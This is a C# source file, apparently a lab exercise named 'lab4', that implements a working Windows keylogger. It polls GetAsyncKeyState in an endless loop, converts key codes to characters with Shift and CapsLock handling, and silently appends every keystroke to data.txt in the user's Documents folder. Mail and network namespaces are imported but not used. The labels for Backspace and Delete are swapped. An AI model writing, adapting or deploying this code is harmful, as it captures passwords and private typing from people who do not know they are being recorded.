using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace lab4
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("User32.dll")]
        public static extern int GetKeyState(Int32 i);
        static void Main(string[] args)
        {
            /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            Console.OutputEncoding = System.Text.Encoding.Unicode;

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\data.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter streamWriter = File.CreateText(path)) { }
            }
            /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            while (true)
            {
                Thread.Sleep(5);
                for (int i = 8; i < 256; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    string symbol = "";
                    if (keyState == 32769)
                    {
                        if (i == 160 || i == 161 || i == 162 || i == 163 || i == 164 || i == 165 || i == 16 || i == 17 || i == 18)
                        {
                            break;
                        }
                        if (GetKeyState(16) != 65408 && GetKeyState(16) != 65409)
                        {
                            if (i >= 65 && i <= 90)
                            {
                                if (Console.CapsLock == false)
                                    i += 32;
                            }
                            else
                            {
                                switch (i)
                                {
                                    case 188: i = ','; break;
                                    case 190: i = '.'; break;
                                    case 191: i = '/'; break;
                                    case 186: i = ';'; break;
                                    case 222: i = 39; break;
                                    case 219: i = '['; break;
                                    case 221: i = ']'; break;
                                    case 220: i = 92; break;
                                    case 189: i = '-'; break;
                                    case 187: i = '='; break;
                                    case 192: i = '`'; break;
                                }
                            }
                        }
                        else
                        {
                            if (i >= 65 && i <= 90)
                            {
                                if (Console.CapsLock == true)
                                    i += 32;
                            }
                            else if (i >= 48 && i <= 57)
                            {
                                switch (i)
                                {
                                    case 48: i = ')'; break;
                                    case 49: i = '!'; break;
                                    case 50: i = '@'; break;
                                    case 51: i = '#'; break;
                                    case 52: i = '$'; break;
                                    case 53: i = '%'; break;
                                    case 54: i = '^'; break;
                                    case 55: i = '&'; break;
                                    case 56: i = '*'; break;
                                    case 57: i = '('; break;
                                }
                            }
                            else
                            {
                                switch (i)
                                {
                                    case 188: i = '<'; break;
                                    case 190: i = '>'; break;
                                    case 191: i = '?'; break;
                                    case 186: i = ':'; break;
                                    case 222: i = '"'; break;
                                    case 219: i = '{'; break;
                                    case 221: i = '}'; break;
                                    case 220: i = '|'; break;
                                    case 189: i = '_'; break;
                                    case 187: i = '+'; break;
                                    case 192: i = '~'; break;
                                }
                            }
                        }
                        if (i == 37 || i == 38 || i == 39 || i == 40 || i == 13 || i == 46 || i == 8)
                        {
                            switch (i)
                            {
                                case 37: symbol = "←"; break;
                                case 38: symbol = "↑"; break;
                                case 39: symbol = "→"; break;
                                case 40: symbol = "↓"; break;
                                case 13: symbol = "_Enter_"; break;
                                case 46: symbol = "_Backspace_"; break;
                                case 8: symbol = "_Delete_"; break;
                            }
                            using (StreamWriter streamWriter = File.AppendText(path))
                            {
                                streamWriter.Write(symbol);
                            }
                        }
                        else
                        {
                            using (StreamWriter streamWriter = File.AppendText(path))
                            {
                                streamWriter.Write((char)i);
                            }
                        }
                    }
                }
            }
        }
    }
}